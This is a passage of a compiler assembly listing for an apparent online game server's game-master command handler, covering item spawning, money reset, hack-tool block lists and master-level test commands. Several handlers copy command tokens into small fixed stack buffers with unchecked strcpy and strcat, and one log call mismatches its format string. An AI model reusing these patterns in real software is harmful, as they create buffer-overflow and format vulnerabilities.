	ff ff		 movzx	 eax, BYTE PTR _level$133[ebp]
  01008	50		 push	 eax
  01009	8b 8d 98 fc ff
	ff		 mov	 ecx, DWORD PTR _itemtype$118[ebp]
  0100f	51		 push	 ecx
  01010	69 55 10 a0 1b
	00 00		 imul	 edx, DWORD PTR _aIndex$[ebp], 7072
  01017	a1 00 00 00 00	 mov	 eax, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  0101c	0f b6 8c 10 06
	01 00 00	 movzx	 ecx, BYTE PTR [eax+edx+262]
  01024	51		 push	 ecx
  01025	69 55 10 a0 1b
	00 00		 imul	 edx, DWORD PTR _aIndex$[ebp], 7072
  0102c	a1 00 00 00 00	 mov	 eax, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  01031	0f b6 8c 10 04
	01 00 00	 movzx	 ecx, BYTE PTR [eax+edx+260]
  01039	51		 push	 ecx
  0103a	69 55 10 a0 1b
	00 00		 imul	 edx, DWORD PTR _aIndex$[ebp], 7072
  01041	a1 00 00 00 00	 mov	 eax, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  01046	0f b6 8c 10 09
	01 00 00	 movzx	 ecx, BYTE PTR [eax+edx+265]
  0104e	51		 push	 ecx
  0104f	8b 55 10	 mov	 edx, DWORD PTR _aIndex$[ebp]
  01052	52		 push	 edx
  01053	e8 00 00 00 00	 call	 ?ItemSerialCreateSend@@YAXHEEEHEEEEEHEEH@Z ; ItemSerialCreateSend
  01058	83 c4 38	 add	 esp, 56			; 00000038H

; 1720 : 			}

  0105b	e9 51 ff ff ff	 jmp	 $LN22@Management
$LN23@Management:

; 1721 : 			
; 1722 : 		}
; 1723 : 		}
; 1724 : 	break;

  01060	e9 57 2c 00 00	 jmp	 $LN2@Management
$LN113@Management:

; 1725 : 
; 1726 : 	//  
; 1727 : 	case GMCMD_MANYMANYCHAOS:
; 1728 : 		{		
; 1729 : 			for( int i = 0; i < 15; i++ )

  01065	c7 85 90 fc ff
	ff 00 00 00 00	 mov	 DWORD PTR _i$116[ebp], 0
  0106f	eb 0f		 jmp	 SHORT $LN27@Management
$LN25@Management:
  01071	8b 85 90 fc ff
	ff		 mov	 eax, DWORD PTR _i$116[ebp]
  01077	83 c0 01	 add	 eax, 1
  0107a	89 85 90 fc ff
	ff		 mov	 DWORD PTR _i$116[ebp], eax
$LN27@Management:
  01080	83 bd 90 fc ff
	ff 0f		 cmp	 DWORD PTR _i$116[ebp], 15 ; 0000000fH
  01087	7d 72		 jge	 SHORT $LN26@Management

; 1730 : 				ItemSerialCreateSend(aIndex, gObj[aIndex].MapNumber, gObj[aIndex].X, gObj[aIndex].Y, MAKE_ITEMNUM(12,15), 0, (BYTE)0, 0, 0, 0, -1, 0, 0);

  01089	6a 00		 push	 0
  0108b	6a 00		 push	 0
  0108d	6a 00		 push	 0
  0108f	6a ff		 push	 -1
  01091	6a 00		 push	 0
  01093	6a 00		 push	 0
  01095	6a 00		 push	 0
  01097	6a 00		 push	 0
  01099	6a 00		 push	 0
  0109b	6a 0f		 push	 15			; 0000000fH
  0109d	6a 0c		 push	 12			; 0000000cH
  0109f	e8 00 00 00 00	 call	 ?MakeItemNumber@@YAHHH@Z ; MakeItemNumber
  010a4	83 c4 08	 add	 esp, 8
  010a7	50		 push	 eax
  010a8	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  010af	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  010b5	0f b6 94 01 06
	01 00 00	 movzx	 edx, BYTE PTR [ecx+eax+262]
  010bd	52		 push	 edx
  010be	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  010c5	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  010cb	0f b6 94 01 04
	01 00 00	 movzx	 edx, BYTE PTR [ecx+eax+260]
  010d3	52		 push	 edx
  010d4	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  010db	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  010e1	0f b6 94 01 09
	01 00 00	 movzx	 edx, BYTE PTR [ecx+eax+265]
  010e9	52		 push	 edx
  010ea	8b 45 10	 mov	 eax, DWORD PTR _aIndex$[ebp]
  010ed	50		 push	 eax
  010ee	e8 00 00 00 00	 call	 ?ItemSerialCreateSend@@YAXHEEEHEEEEEHEEH@Z ; ItemSerialCreateSend
  010f3	83 c4 38	 add	 esp, 56			; 00000038H
  010f6	e9 76 ff ff ff	 jmp	 $LN25@Management
$LN26@Management:

; 1731 : 		}
; 1732 : 	break;

  010fb	e9 bc 2b 00 00	 jmp	 $LN2@Management
$LN114@Management:

; 1733 : 
; 1734 : 	//  
; 1735 : 	case GMCMD_MANYMANYLIFE:
; 1736 : 		{		
; 1737 : 			for( int i = 0; i < 15; i++ )

  01100	c7 85 8c fc ff
	ff 00 00 00 00	 mov	 DWORD PTR _i$115[ebp], 0
  0110a	eb 0f		 jmp	 SHORT $LN30@Management
$LN28@Management:
  0110c	8b 85 8c fc ff
	ff		 mov	 eax, DWORD PTR _i$115[ebp]
  01112	83 c0 01	 add	 eax, 1
  01115	89 85 8c fc ff
	ff		 mov	 DWORD PTR _i$115[ebp], eax
$LN30@Management:
  0111b	83 bd 8c fc ff
	ff 0f		 cmp	 DWORD PTR _i$115[ebp], 15 ; 0000000fH
  01122	7d 72		 jge	 SHORT $LN29@Management

; 1738 : 				ItemSerialCreateSend(aIndex, gObj[aIndex].MapNumber, gObj[aIndex].X, gObj[aIndex].Y, MAKE_ITEMNUM(14,16), 0, (BYTE)0, 0, 0, 0, -1, 0, 0);

  01124	6a 00		 push	 0
  01126	6a 00		 push	 0
  01128	6a 00		 push	 0
  0112a	6a ff		 push	 -1
  0112c	6a 00		 push	 0
  0112e	6a 00		 push	 0
  01130	6a 00		 push	 0
  01132	6a 00		 push	 0
  01134	6a 00		 push	 0
  01136	6a 10		 push	 16			; 00000010H
  01138	6a 0e		 push	 14			; 0000000eH
  0113a	e8 00 00 00 00	 call	 ?MakeItemNumber@@YAHHH@Z ; MakeItemNumber
  0113f	83 c4 08	 add	 esp, 8
  01142	50		 push	 eax
  01143	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  0114a	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  01150	0f b6 94 01 06
	01 00 00	 movzx	 edx, BYTE PTR [ecx+eax+262]
  01158	52		 push	 edx
  01159	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  01160	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  01166	0f b6 94 01 04
	01 00 00	 movzx	 edx, BYTE PTR [ecx+eax+260]
  0116e	52		 push	 edx
  0116f	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  01176	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  0117c	0f b6 94 01 09
	01 00 00	 movzx	 edx, BYTE PTR [ecx+eax+265]
  01184	52		 push	 edx
  01185	8b 45 10	 mov	 eax, DWORD PTR _aIndex$[ebp]
  01188	50		 push	 eax
  01189	e8 00 00 00 00	 call	 ?ItemSerialCreateSend@@YAXHEEEHEEEEEHEEH@Z ; ItemSerialCreateSend
  0118e	83 c4 38	 add	 esp, 56			; 00000038H
  01191	e9 76 ff ff ff	 jmp	 $LN28@Management
$LN29@Management:

; 1739 : 		}
; 1740 : 	break;

  01196	e9 21 2b 00 00	 jmp	 $LN2@Management
$LN115@Management:

; 1741 : 
; 1742 : 	//  
; 1743 : 	case GMCMD_MANYMANYCREATE:
; 1744 : 		{		
; 1745 : 			for( int i = 0; i < 15; i++ )

  0119b	c7 85 88 fc ff
	ff 00 00 00 00	 mov	 DWORD PTR _i$114[ebp], 0
  011a5	eb 0f		 jmp	 SHORT $LN33@Management
$LN31@Management:
  011a7	8b 85 88 fc ff
	ff		 mov	 eax, DWORD PTR _i$114[ebp]
  011ad	83 c0 01	 add	 eax, 1
  011b0	89 85 88 fc ff
	ff		 mov	 DWORD PTR _i$114[ebp], eax
$LN33@Management:
  011b6	83 bd 88 fc ff
	ff 0f		 cmp	 DWORD PTR _i$114[ebp], 15 ; 0000000fH
  011bd	7d 72		 jge	 SHORT $LN32@Management

; 1746 : 				ItemSerialCreateSend(aIndex, gObj[aIndex].MapNumber, gObj[aIndex].X, gObj[aIndex].Y, MAKE_ITEMNUM(14,22), 0, (BYTE)0, 0, 0, 0, -1, 0, 0);

  011bf	6a 00		 push	 0
  011c1	6a 00		 push	 0
  011c3	6a 00		 push	 0
  011c5	6a ff		 push	 -1
  011c7	6a 00		 push	 0
  011c9	6a 00		 push	 0
  011cb	6a 00		 push	 0
  011cd	6a 00		 push	 0
  011cf	6a 00		 push	 0
  011d1	6a 16		 push	 22			; 00000016H
  011d3	6a 0e		 push	 14			; 0000000eH
  011d5	e8 00 00 00 00	 call	 ?MakeItemNumber@@YAHHH@Z ; MakeItemNumber
  011da	83 c4 08	 add	 esp, 8
  011dd	50		 push	 eax
  011de	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  011e5	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  011eb	0f b6 94 01 06
	01 00 00	 movzx	 edx, BYTE PTR [ecx+eax+262]
  011f3	52		 push	 edx
  011f4	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  011fb	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  01201	0f b6 94 01 04
	01 00 00	 movzx	 edx, BYTE PTR [ecx+eax+260]
  01209	52		 push	 edx
  0120a	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  01211	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  01217	0f b6 94 01 09
	01 00 00	 movzx	 edx, BYTE PTR [ecx+eax+265]
  0121f	52		 push	 edx
  01220	8b 45 10	 mov	 eax, DWORD PTR _aIndex$[ebp]
  01223	50		 push	 eax
  01224	e8 00 00 00 00	 call	 ?ItemSerialCreateSend@@YAXHEEEHEEEEEHEEH@Z ; ItemSerialCreateSend
  01229	83 c4 38	 add	 esp, 56			; 00000038H
  0122c	e9 76 ff ff ff	 jmp	 $LN31@Management
$LN32@Management:

; 1747 : 		}
; 1748 : 	break;

  01231	e9 86 2a 00 00	 jmp	 $LN2@Management
$LN116@Management:

; 1749 : 
; 1750 : 	case GMCMD_RESETZEN:
; 1751 : 		{
; 1752 : 			gObj[aIndex].Money = 0;

  01236	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  0123d	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  01243	c7 84 01 b0 00
	00 00 00 00 00
	00		 mov	 DWORD PTR [ecx+eax+176], 0

; 1753 : 			GCMoneySend(aIndex, 0);

  0124e	6a 00		 push	 0
  01250	8b 45 10	 mov	 eax, DWORD PTR _aIndex$[ebp]
  01253	50		 push	 eax
  01254	e8 00 00 00 00	 call	 ?GCMoneySend@@YAXHK@Z	; GCMoneySend
  01259	83 c4 08	 add	 esp, 8

; 1754 : 		}
; 1755 : 	break;

  0125c	e9 5b 2a 00 00	 jmp	 $LN2@Management
$LN117@Management:

; 1756 : ////////////////////////////////////////////////////////////////////////////////////////////////
; 1757 : 	
; 1758 : #ifdef ADD_HACKING_TOOL_BLOCK_20090311
; 1759 : 	case GMCMD_ADD_HACKTOOL_MOVE_BLOCK:
; 1760 : 		{
; 1761 : 			//           .
; 1762 : 			// / " " "   " " " " "
; 1763 : 			char chFileName[64];
; 1764 : 			char chActiveTime[20];
; 1765 : 			char chHMSDate[10];
; 1766 : 			int iActiveTerm = 0;
; 1767 : 			int iActiveRate = 0;
; 1768 : 
; 1769 : 			DWORD dwActiveTime = 0;
; 1770 : 
; 1771 : 			strcpy( chFileName, GetTokenString() );
; 1772 : 			strcpy( chActiveTime, GetTokenString() );
; 1773 : 			strcpy( chHMSDate, GetTokenString() );
; 1774 : 			strcat( chActiveTime, " " );
; 1775 : 			strcat( chActiveTime, chHMSDate );
; 1776 : 			iActiveTerm = GetTokenNumber();
; 1777 : 			iActiveRate = GetTokenNumber();
; 1778 : 
; 1779 : 			dwActiveTime = g_HackToolBlock.MakeDateToDword( chActiveTime );
; 1780 : 
; 1781 : 			g_HackToolBlock.SetGMObject( &gObj[aIndex] );
; 1782 : 
; 1783 : 			CTime tCurrentTime = CTime::GetCurrentTime();
; 1784 : 			CTime tActiveTime( dwActiveTime );
; 1785 : 
; 1786 : 			if( tCurrentTime > tActiveTime )
; 1787 : 			{
; 1788 : 				//     .
; 1789 : 				g_HackToolBlock.SendNoticeToGM( "[ANTI-HACK]     .",
; 1790 : 					chFileName, 
; 1791 : 					chActiveTime,
; 1792 : 					iActiveTerm,
; 1793 : 					iActiveRate );
; 1794 : 			}
; 1795 : 			else
; 1796 : 			{
; 1797 : 				g_HackToolBlock.SendNoticeToGM( "[ANTI-HACK]    . Name : %s, ActiveTime : %s, Term : %d, Rate : %d%%",
; 1798 : 					chFileName, 
; 1799 : 					chActiveTime,
; 1800 : 					iActiveTerm,
; 1801 : 					iActiveRate );
; 1802 : 			}
; 1803 : 
; 1804 : 			LogAddTD( "[ANTI-HACK] Add Block Antihack tool User Program [%s] Time Set [%s] Term [%d] Block Rate [%d]",
; 1805 : 				chFileName ,
; 1806 : 				chActiveTime ,
; 1807 : 				iActiveTerm ,
; 1808 : 				iActiveRate
; 1809 : 				);
; 1810 : 
; 1811 : #ifdef MODIFY_HACKTOOL_BLOCK_ALL_SESSION_20090422
; 1812 : 			GJRequestHacktoolMapMoveBlock( HACKTOOL_MODIFY_TYPE_ADD, chFileName, dwActiveTime, iActiveTerm, iActiveRate );
; 1813 : #else
; 1814 : 	#ifdef MODIFY_HACKING_TOOL_BLOCK_SINGLE_SERVER_20090325
; 1815 : 			g_HackToolBlock.AddHacktoolData( chFileName, dwActiveTime, iActiveTerm, iActiveRate );
; 1816 : 			g_HackToolBlock.HacktoolStatisticsAll( chFileName );
; 1817 : 	#else
; 1818 : 			//GJRequestHacktoolMapMoveBlock( chFileName, 
; 1819 : 	#endif // MODIFY_HACKING_TOOL_BLOCK_SINGLE_SERVER_20090325
; 1820 : #endif // MODIFY_HACKTOOL_BLOCK_ALL_SESSION_20090422
; 1821 : 		}
; 1822 : 		break;
; 1823 : 	case GMCMD_MODIFY_HACKTOOL_MOVE_BLOCK:
; 1824 : 		{
; 1825 : 			//       .
; 1826 : 			// / " " "   " " " " "
; 1827 : 			char chFileName[64];
; 1828 : 			char chActiveTime[20];
; 1829 : 			char chHMSDate[10];
; 1830 : 			int iActiveTerm = 0;
; 1831 : 			int iActiveRate = 0;
; 1832 : 
; 1833 : 			DWORD dwActiveTime = 0;
; 1834 : 
; 1835 : 			strcpy( chFileName, GetTokenString() );
; 1836 : 			strcpy( chActiveTime, GetTokenString() );
; 1837 : 			strcpy( chHMSDate, GetTokenString() );
; 1838 : 			strcat( chActiveTime, " " );
; 1839 : 			strcat( chActiveTime, chHMSDate );
; 1840 : 			iActiveTerm = GetTokenNumber();
; 1841 : 			iActiveRate = GetTokenNumber();
; 1842 : 
; 1843 : 			dwActiveTime = g_HackToolBlock.MakeDateToDword( chActiveTime );
; 1844 : 
; 1845 : 			LogAddTD( "[ANTI-HACK] Modify Block Antihack tool User Program [%s] Time Set [%d] Term [%d] Block Rate [%d]",
; 1846 : 				chFileName ,
; 1847 : 				chActiveTime ,
; 1848 : 				iActiveTerm ,
; 1849 : 				iActiveRate
; 1850 : 				);
; 1851 : 
; 1852 : #ifdef MODIFY_HACKTOOL_BLOCK_ALL_SESSION_20090422
; 1853 : 			GJRequestHacktoolMapMoveBlock( HACKTOOL_MODIFY_TYPE_MODIFY, chFileName, dwActiveTime, iActiveTerm, iActiveRate );
; 1854 : #else
; 1855 : 			g_HackToolBlock.AddHacktoolData( chFileName, dwActiveTime, iActiveTerm, iActiveRate );
; 1856 : 			g_HackToolBlock.HacktoolStatisticsAll( chFileName );
; 1857 : #endif // MODIFY_HACKTOOL_BLOCK_ALL_SESSION_20090422
; 1858 : 		}
; 1859 : 		break;
; 1860 : 	case GMCMD_REMOVE_HACKTOOL_MOVE_BLOCK:
; 1861 : 		{
; 1862 : 			//       .
; 1863 : 			// / " "
; 1864 : 			char chFileName[64];
; 1865 : 			
; 1866 : 			strcpy( chFileName, GetTokenString() );
; 1867 : 			LogAddTD( "[ANTI-HACK] Remove Block Antihack tool User Program [%s]",
; 1868 : 				chFileName 
; 1869 : 				);
; 1870 : 
; 1871 : 			g_HackToolBlock.SendNoticeToGM( "[ANTI-HACK]    . ( Name : %s )",
; 1872 : 				chFileName );
; 1873 : #ifdef MODIFY_HACKTOOL_BLOCK_ALL_SESSION_20090422
; 1874 : 			GJRequestHacktoolMapMoveBlock( HACKTOOL_MODIFY_TYPE_REMOVE, chFileName, 0, 0, 0 );
; 1875 : #else
; 1876 : 			g_HackToolBlock.RemoveHacktoolData( chFileName );
; 1877 : #endif // MODIFY_HACKTOOL_BLOCK_ALL_SESSION_20090422
; 1878 : 		}
; 1879 : 		break;
; 1880 : 	case GMCMD_STATISTICS_HACKTOOL:
; 1881 : 		{
; 1882 : 			//     .
; 1883 : 			//  
; 1884 : 			// /ANTIHACKSTATISTIC " "
; 1885 : 			char chFileName[64];
; 1886 : 			
; 1887 : 			strcpy( chFileName, GetTokenString() );
; 1888 : 			
; 1889 : 			LogAddTD( "[ANTI-HACK] Statistics Antihack tool User Program [%s]",
; 1890 : 				chFileName
; 1891 : 				);
; 1892 : 
; 1893 : 			g_HackToolBlock.SendNoticeToGM( "[ANTI-HACK]     . ( Name : %s )",
; 1894 : 				chFileName );
; 1895 : 
; 1896 : #ifdef MODIFY_HACKTOOL_BLOCK_ALL_SESSION_20090422
; 1897 : 			GJRequestAntiHackStatistics( chFileName );
; 1898 : #else
; 1899 : 			g_HackToolBlock.HacktoolStatisticsAll( chFileName );
; 1900 : #endif // MODIFY_HACKTOOL_BLOCK_ALL_SESSION_20090422
; 1901 : 		}
; 1902 : 		break;
; 1903 : #endif // ADD_HACKING_TOOL_BLOCK_20090311
; 1904 : 
; 1905 : #ifdef ADD_MASTER_LEVEL_SYSTEM_COMMAND_20071122		//  
; 1906 : 	case GMCMD_MASTERLEVEL_LEVELUP:		// /masterlevel
; 1907 : 		{
; 1908 : 			int iChangeLevel = GetTokenNumber();
; 1909 : 			if( iChangeLevel < 0 ) iChangeLevel = 0;
; 1910 : 			else if( iChangeLevel > 200 ) iChangeLevel = 200;
; 1911 : 
; 1912 : #ifdef MODIFY_MASTER_LEVEL_SYSTEM_COMMAND_20080417
; 1913 : 			//  -    
; 1914 : 			if( !g_MasterLevelSystem.IsMasterLevelUser( lpObj ) 
; 1915 : 				|| (lpObj->m_nMasterLevel > 0 && iChangeLevel == 0)
; 1916 : 				)
; 1917 : #else
; 1918 : 				//   .
; 1919 : 			if( !g_MasterLevelSystem.IsMasterLevelUser( lpObj ) )
; 1920 : #endif // MODIFY_MASTER_LEVEL_SYSTEM_COMMAND_20080417
; 1921 : 			{
; 1922 : 				LogAddTD( "Use Test Command [%s][%s] /masterlevel %d -> Fail!!",
; 1923 : 				lpObj->AccountID, lpObj->Name, iChangeLevel );
; 1924 : 				return 0;
; 1925 : 			}
; 1926 : 
; 1927 : 			lpObj->m_nMasterLevel			= iChangeLevel;
; 1928 : 			lpObj->m_i64MasterLevelExp		= g_MasterLevelSystem.GetMasterLevelExpTlbInfo( iChangeLevel );
; 1929 : 			lpObj->m_i64NextMasterLevelExp	= g_MasterLevelSystem.GetMasterLevelExpTlbInfo( iChangeLevel + 1 );
; 1930 : 			
; 1931 : 			g_MasterLevelSystem.GCMasterLevelInfo( lpObj );
; 1932 : 			LogAddTD( "Use Test Command [%s][%s] /masterlevel %d -> Success!!",
; 1933 : 				lpObj->AccountID, lpObj->Name, iChangeLevel );
; 1934 : 		}
; 1935 : 		break;
; 1936 : 
; 1937 : 	case GMCMD_MASTERLEVEL_POINT:	// /mlpoint
; 1938 : 		{
; 1939 : 			int iMLPoint = GetTokenNumber();
; 1940 : 
; 1941 : 			//   .
; 1942 : 			if( !g_MasterLevelSystem.IsMasterLevelUser( lpObj ) )
; 1943 : 			{
; 1944 : 				LogAddTD( "Use Test Command [%s][%s] /mlpoint %d -> Fail!!",
; 1945 : 				lpObj->AccountID, lpObj->Name, iMLPoint );
; 1946 : 				return 0;
; 1947 : 			}
; 1948 : 
; 1949 : 			lpObj->m_iMasterLevelPoint		= iMLPoint;					
; 1950 : 			g_MasterLevelSystem.GCMasterLevelInfo( lpObj );
; 1951 : 			LogAddTD( "Use Test Command [%s][%s] /mlpoint %d -> Success!!",
; 1952 : 				lpObj->AccountID, lpObj->Name, iMLPoint );
; 1953 : 		}
; 1954 : 		break;
; 1955 : 	case GMCMD_MASTERLEVEL_SKILL_RESET:	// /ms_reset
; 1956 : 		{
; 1957 : 			//     .
; 1958 : 			for( int n=0; n<MAX_MAGIC; n++ )
; 1959 : 			{
; 1960 : 				if( lpObj->Magic[n].IsMagic() == TRUE )
; 1961 : 				{
; 1962 : #ifdef ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107	//    
; 1963 : 					if( g_MasterSkillSystem.CheckMasterLevelSkill( lpObj->Magic[n].m_Skill ) )
; 1964 : #else
; 1965 : 					if( MagicDamageC.GetSkillUseType( lpObj->Magic[n].m_Skill ) == SKILL_USETYPE_MASTERSKILL_PASSIVE )
; 1966 : #endif
; 1967 : 					{
; 1968 : 						lpObj->Magic[n].Clear();
; 1969 : 					}
; 1970 : 				}
; 1971 : 			}
; 1972 : 
; 1973 : 			//  
; 1974 : 			GCServerMsgStringSend( "Master Skill Reset", lpObj->m_Index, 1 );
; 1975 : 			LogAddTD( "Use Test Command [%s][%s] /ms_reset %d",
; 1976 : 				lpObj->AccountID, lpObj->Name, lpObj->m_iMasterLevelPoint );
; 1977 : 
; 1978 : 			gObjCloseSet(lpObj->m_Index, CL_BACK);	
; 1979 : 		}
; 1980 : 		break;
; 1981 : #endif	// ADD_MASTER_LEVEL_SYSTEM_COMMAND_20071122
; 1982 : 
; 1983 : #ifdef MODIFY_SPEEDHACK_20080605
; 1984 : 	case GMCMD_ABILITY_DEBUG:
; 1985 : 		{
; 1986 : 			int nFlag = GetTokenNumber();
; 1987 : 			g_bAbilityDebug = (nFlag == 1) ? TRUE : FALSE;
; 1988 : 			
; 1989 : 			char szMsg[256]; 
; 1990 : 			wsprintf(szMsg, "Ability Debug: %s", ((g_bAbilityDebug == TRUE) ? "On" : "Off"));
; 1991 : 			GCServerMsgStringSend( szMsg, lpObj->m_Index, 1 );
; 1992 : 		}
; 1993 : 		break;
; 1994 : #endif // MODIFY_SPEEDHACK_20080605
; 1995 : 
; 1996 : #if TESTSERVER == 1 && defined(ADD_ITEM_ATTACK_XMASEVENT_20081014)
; 1997 : 	case GMCMD_XMASEVENT_START:
; 1998 : 		{
; 1999 : 			int nExecuteDirect = GetTokenNumber();
; 2000 : 			if (nExecuteDirect != TRUE) nExecuteDirect = FALSE;
; 2001 : 			
; 2002 : 			if (g_XMasAttackEvent.IsPossibleExecuteDirect())
; 2003 : 			{
; 2004 : 				GCServerMsgStringSend("XMasAttackEvent ExecuteDirect", lpObj->m_Index, 1 );
; 2005 : 				g_XMasAttackEvent.ExecuteDirect(nExecuteDirect);
; 2006 : 			}
; 2007 : 			else
; 2008 : 			{
; 2009 : 				GCServerMsgStringSend("XMasAttackEvent fail ExecuteDirect", lpObj->m_Index, 1 );
; 2010 : 			}
; 2011 : 		}
; 2012 : 		break;
; 2013 : #endif // ADD_ITEM_ATTACK_XMASEVENT_20081014
; 2014 : 
; 2015 : #if TESTSERVER == 1 && defined(ADD_GIFTITEM_XMASEVENT_20081030)
; 2016 : 	case GMCMD_XMASEVENT_SETVISITORCNT:
; 2017 : 		{
; 2018 : 			int nCount = GetTokenNumber();
; 2019 : 			if(nCount < 0) {
; 2020 : 				nCount = 0;
; 2021 : 			} else if(nCount > INT_MAX){
; 2022 : 				nCount = INT_MAX;
; 2023 : 			}
; 2024 : 			
; 2025 : 			gXmasVisitorCount = nCount;
; 2026 : 			
; 2027 : 			char szMsg[256]; 
; 2028 : 			wsprintf(szMsg, "[X-Mas] [Visitor Count] : [%d] ", gXmasVisitorCount);
; 2029 : 			GCServerMsgStringSend(szMsg, lpObj->m_Index, 1 );
; 2030 : 		}
; 2031 : 		break;
; 2032 : 	case GMCMD_XMASEVENT_SETSANTAMODE:
; 2033 : 		{
; 2034 : 			short nTestFlag = GetTokenNumber();
; 2035 : 			if(nTestFlag < 0 || nTestFlag > 2) break;
; 2036 : 			
; 2037 : 			gXmasGiftForTest = nTestFlag;
; 2038 : 			
; 2039 : 			char szMsg[256]; 
; 2040 : 			wsprintf(szMsg, "[X-Mas] [CURRENT MODE] : %d ", gXmasGiftForTest);
; 2041 : 			GCServerMsgStringSend(szMsg, lpObj->m_Index, 1 );
; 2042 : 			
; 2043 : 		}
; 2044 : #endif
; 2045 : 
; 2046 : 
; 2047 : #ifdef ADD_ITEM_SOCKET_OPTION_SYSTEM_20080415
; 2048 : 	case GMCMD_SET_SOCKET_OPTION:
; 2049 : 		{
; 2050 : 			int iInventoryPos;
; 2051 : 			BYTE SeedIndex;
; 2052 : 			BYTE SphereLevel;
; 2053 : 			BYTE SocketSlot;
; 2054 : 
; 2055 : 			iInventoryPos = GetTokenNumber();
; 2056 : 			SeedIndex = GetTokenNumber();
; 2057 : 			SphereLevel = GetTokenNumber();
; 2058 : 			SocketSlot = GetTokenNumber();
; 2059 : 
; 2060 : 			g_SocketOptionSystem.SetSocketSlot( &lpObj->pInventory[iInventoryPos], SeedIndex, SphereLevel-1, SocketSlot-1 );
; 2061 : 			GCInventoryItemOneSend( lpObj->m_Index, iInventoryPos );
; 2062 : 		}
; 2063 : 		break;
; 2064 : 	case GMCMD_CLEAR_SOCKET_OPTION:
; 2065 : 		{
; 2066 : 			int iInventoryPos;
; 2067 : 			BYTE SocketSlot;
; 2068 : 
; 2069 : 			iInventoryPos = GetTokenNumber();
; 2070 : 			SocketSlot = GetTokenNumber();
; 2071 : 
; 2072 : 			if( SocketSlot == 0 )
; 2073 : 			{
; 2074 : 				for( int i = 0 ; i < MAX_SOCKET_SLOT ; i++ )
; 2075 : 				{
; 2076 : 					g_SocketOptionSystem.ClearSocketSlot( &lpObj->pInventory[iInventoryPos], i );
; 2077 : 				}
; 2078 : 			}
; 2079 : 			else
; 2080 : 			{
; 2081 : 				g_SocketOptionSystem.ClearSocketSlot( &lpObj->pInventory[iInventoryPos], SocketSlot-1 );
; 2082 : 			}
; 2083 : 			GCInventoryItemOneSend( lpObj->m_Index, iInventoryPos );
; 2084 : 		}
; 2085 : 		break;
; 2086 : 	#ifdef MODIFY_ITEM_SOCKET_OPTION_BUGFIX_04_20080710
; 2087 : 	case GMCMD_MAKE_SOCKET_SLOT:
; 2088 : 		{
; 2089 : 			int iInventoryPos;
; 2090 : 			BYTE SocketSlotCount;
; 2091 : 
; 2092 : 			iInventoryPos = GetTokenNumber();
; 2093 : 			SocketSlotCount = GetTokenNumber();
; 2094 : 
; 2095 : 			g_SocketOptionSystem.MakeSocketSlot( &lpObj->pInventory[iInventoryPos], SocketSlotCount );
; 2096 : 			GCInventoryItemOneSend( lpObj->m_Index, iInventoryPos );
; 2097 : 		}
; 2098 : 		break;
; 2099 : 	#endif // MODIFY_ITEM_SOCKET_OPTION_BUGFIX_04_20080710
; 2100 : #endif // ADD_ITEM_SOCKET_OPTION_SYSTEM_20080415
; 2101 : 
; 2102 : #endif
; 2103 : 	
; 2104 : 
; 2105 : 	//------------------------------------------------------------------------
; 2106 : 	// 
; 2107 : 	case GMCMD_FIRECRACK :	
; 2108 : 		{
; 2109 : 			int x, y;			
; 2110 : 			x   = lpObj->X;

  01261	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  01264	0f bf 88 04 01
	00 00		 movsx	 ecx, WORD PTR [eax+260]
  0126b	89 8d 84 fc ff
	ff		 mov	 DWORD PTR _x$113[ebp], ecx

; 2111 : 			y   = lpObj->Y;

  01271	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  01274	0f bf 88 06 01
	00 00		 movsx	 ecx, WORD PTR [eax+262]
  0127b	89 8d 80 fc ff
	ff		 mov	 DWORD PTR _y$112[ebp], ecx

; 2112 : 
; 2113 : 			PMSG_SERVERCMD	ServerCmd;
; 2114 : 			PHeadSubSetB((LPBYTE)&ServerCmd, 0xF3, 0x40, sizeof(ServerCmd));			

  01281	6a 07		 push	 7
  01283	6a 40		 push	 64			; 00000040H
  01285	68 f3 00 00 00	 push	 243			; 000000f3H
  0128a	8d 85 78 fc ff
	ff		 lea	 eax, DWORD PTR _ServerCmd$111[ebp]
  01290	50		 push	 eax
